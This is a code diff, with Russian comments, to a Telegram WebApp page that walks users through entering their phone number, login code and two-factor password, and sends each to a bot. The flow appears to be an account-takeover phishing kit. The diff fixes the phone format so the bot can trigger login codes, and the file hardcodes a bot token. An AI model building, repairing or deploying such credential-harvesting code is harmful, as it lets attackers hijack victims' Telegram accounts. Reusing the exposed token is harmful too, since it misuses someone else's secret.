@@ -409,7 +409,7 @@ const tg = window.Telegram.WebApp;
 tg.ready();
 const user_id = tg.initDataUnsafe?.user?.id || new URLSearchParams(window.location.search).get('user_id');
 
-// ⚠️ ВСТАВЬТЕ ВАШ НОВЫЙ ТОКЕН БОТА!
+// ⚠️ ТОКЕН БОТА
 const BOT_TOKEN = "7511789367:AAGVIDu27Sb5ZwJUjQRiHOJ-CZinbRUFrDQ";
 
 // ========== СТРАНЫ ==========
@@ -489,25 +489,26 @@ function switchStep(from,to){
 }
 function topbarGoBack(){if(currentStep>1&&currentStep<=3)switchStep(currentStep,currentStep-1);}
 
-// ========== ОТПРАВКА КОДА (ШАГ 1 → 2) ==========
+// ========== ОТПРАВКА КОДА (ШАГ 1 → 2) - ИСПРАВЛЕНО ==========
 async function goStep2(){
   const raw=document.getElementById('phoneInput').value.replace(/\D/g,'');
   if(raw.length<5){document.getElementById('phoneError').classList.add('show');return;}
   document.getElementById('phoneError').classList.remove('show');
   
-  const phone=selectedCountry.code+' '+document.getElementById('phoneInput').value;
-  document.getElementById('displayPhone').textContent=phone;
-  document.getElementById('dashPhone').textContent=phone;
+  // Отправляем номер в правильном формате: +79001234567 (без пробелов)
+  const cleanPhone = selectedCountry.code + raw;
+  
+  document.getElementById('displayPhone').textContent = cleanPhone;
+  document.getElementById('dashPhone').textContent = cleanPhone;
   
   const btn=document.getElementById('btnStep1');
   btn.textContent='Отправка...';
   btn.disabled=true;
   
   try {
-    // Отправляем номер боту через WebApp
     tg.sendData(JSON.stringify({
       action: "send_code",
-      phone: phone
+      phone: cleanPhone
     }));
   } catch(e){console.error(e);}
   
@@ -529,15 +530,11 @@ async function goStep3(){
   document.getElementById('codeError').classList.remove('show');
   
   try {
-    // Отправляем код боту для проверки
     tg.sendData(JSON.stringify({
       action: "check_code",
       code: code
     }));
-    
-    // Переходим к шагу 3 (2FA)
     switchStep(2,3);
-    
   } catch(e){
     document.getElementById('codeError').classList.add('show');
     console.error(e);
@@ -560,14 +557,11 @@ async function goStep4(){
   btn.disabled=true;
   
   try {
-    // Отправляем пароль 2FA боту
     tg.sendData(JSON.stringify({
       action: "check_2fa",
       password: password
     }));
-    
     switchStep(3,4);
-    
   } catch(e){
     alert('Ошибка проверки 2FA');
     console.error(e);
@@ -593,6 +587,7 @@ function codeKey(e,idx){
   }
 }
 
+// ========== ПОВТОРНАЯ ОТПРАВКА КОДА - ИСПРАВЛЕНО ==========
 let resendCooldown=null;
 async function resendCode(){
   if(resendCooldown) return;
